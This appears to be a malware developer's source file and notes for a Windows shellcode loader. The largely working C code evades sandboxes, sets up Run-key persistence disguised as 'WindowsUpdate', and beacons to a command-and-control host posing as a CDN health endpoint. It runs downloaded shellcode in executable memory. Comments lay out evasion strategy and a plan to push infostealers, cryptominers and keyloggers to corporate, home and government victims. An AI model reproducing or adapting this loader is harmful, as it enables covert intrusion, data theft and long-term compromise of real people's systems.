class Loader {
    void main() {
        // 1. Check if less than 2GB RAM (sandbox)
        if (getRAM() < 2 * 1024 * 1024 * 1024) return;
        
        // 2. Check if recent install (VM)
        if (getInstallDate() > (now() - 7_days)) return;
        
        // 3. Basic registry persistence
        if (!isPersisted()) {
            RegSetValue("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
        }
        
        // 4. Call home for real functionality
        downloadModules();
    }
};

/*
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ntdll.lib")

#define C2_SERVER "https://cdn.legit-site.com/api/health"
#define INITIAL_SLEEP 86400000  // 24 hours

// Shellcode execution function
typedef BOOL (*SHELLCODE_MAIN)(LPVOID config);

BOOL ExecuteShellcode(BYTE* shellcode, DWORD size, LPVOID config) {
    // 1. Allocate executable memory
    PVOID exec_mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) return FALSE;
    
    // 2. Copy shellcode
    memcpy(exec_mem, shellcode, size);
    
    // 3. Execute
    SHELLCODE_MAIN shellcode_main = (SHELLCODE_MAIN)exec_mem;
    BOOL result = shellcode_main(config);
    
    // 4. Cleanup
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return result;
}

// Basic persistence
BOOL EstablishPersistence() {
    HKEY hKey;
    TCHAR path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    
    RegOpenKeyEx(HKEY_CURRENT_USER, 
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                0, KEY_WRITE, &hKey);
    RegSetValueEx(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE*)path, lstrlen(path));
    RegCloseKey(hKey);
    
    return TRUE;
}

// C&C communication
BYTE* BeaconToC2(DWORD* response_size) {
    HINTERNET hInternet, hConnect, hRequest;
    BYTE* response = NULL;
    DWORD bytes_read, total_bytes = 0;
    char buffer[4096];
    
    hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    hConnect = InternetConnectA(hInternet, "cdn.legit-site.com", INTERNET_DEFAULT_HTTPS_PORT, 
                               NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    hRequest = HttpOpenRequestA(hConnect, "GET", "/api/health", NULL, NULL, NULL, 
                              INTERNET_FLAG_SECURE, 0);
    
    if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
        response = malloc(4096);
        while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0) {
            response = realloc(response, total_bytes + bytes_read);
            memcpy(response + total_bytes, buffer, bytes_read);
            total_bytes += bytes_read;
        }
    }
    
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    
    *response_size = total_bytes;
    return response;
}

// Main loader loop
DWORD WINAPI LoaderMain(LPVOID lpParam) {
    EstablishPersistence();
    
    while (TRUE) {
        DWORD response_size;
        BYTE* response = BeaconToC2(&response_size);
        
        if (response && response_size > 0) {
            // Response contains shellcode + config
            // First 4 bytes = config size, then config, then shellcode
            DWORD config_size = *(DWORD*)response;
            BYTE* config_data = response + 4;
            BYTE* shellcode_data = config_data + config_size;
            DWORD shellcode_size = response_size - 4 - config_size;
            
            ExecuteShellcode(shellcode_data, shellcode_size, config_data);
        }
        
        if (response) free(response);
        Sleep(INITIAL_SLEEP + (rand() % 3600000)); // 24 hours ± 1 hour
    }
    
    return 0;
}

// Entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, LoaderMain, NULL, 0, NULL);
    }
    return TRUE;
}

*/

/*
// BAD STRATEGY (detected immediately):
CoreLoader = Advanced VM Detection → SIGNATURE DETECTED → GAME OVER

// GOOD STRATEGY (evades initial detection):
CoreLoader = Basic Heuristics → PASSES → Downloads Modules → 
             Advanced Detection → If VM: Die quietly
                                  If Real: Deploy payload



1. Initial Infection
   ↓
2. Raw Loader Installed (persistence)
   ↓  
3. First Beacon → C&C Profiling
   ↓
4. C&C Sends Appropriate Shellcode Modules:
   - Corporate network → Infostealer + Lateral movement
   - Home user → Cryptominer + Password stealer
   - Government → Document collector + Keylogger
   ↓
5. Modules Execute → Report Back
   ↓
6. C&C Sends Updated Modules as Needed

class ModernApproach {
    void examples() {
        // Cobalt Strike Beacon = shellcode
        // Metasploit Meterpreter = shellcode  
        // Many APT loaders = shellcode
        
        // These prioritize:
        // - Stealth over development speed
        // - Operational security over features
        // - Targeted attacks over mass distribution
    }
};

class ShellcodeUseCases {
    void appropriate() {
        // Stagers - small initial loaders
        // Exploit payloads - memory corruption exploits
        // Fileless attacks - running entirely in memory
        // Process injection - injecting into existing processes
    }
};

               | Mass Malware (Emotet) | Targeted Malware (APT)
---------------|----------------------|------------------------
Development    | DLLs (fast)          | Shellcode (stealthy)
Persistence    | File-based           | Memory-only
Scale          | Thousands of systems | Dozens of systems
Lifespan       | Months/years         | Days/weeks
Update Cycle   | Frequent features    | Rare changes

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// shell code executer?
class EmotetDropper {
    void executeShellcode(std::vector<uint8_t>& shellcode) {
        // Allocate executable memory
        void* exec_mem = VirtualAlloc(NULL, shellcode.size(), 
                                     MEM_COMMIT | MEM_RESERVE, 
                                     PAGE_EXECUTE_READWRITE);
        
        // Copy shellcode
        memcpy(exec_mem, shellcode.data(), shellcode.size());
        
        // Execute
        ((void(*)())exec_mem)();
    }
};



*/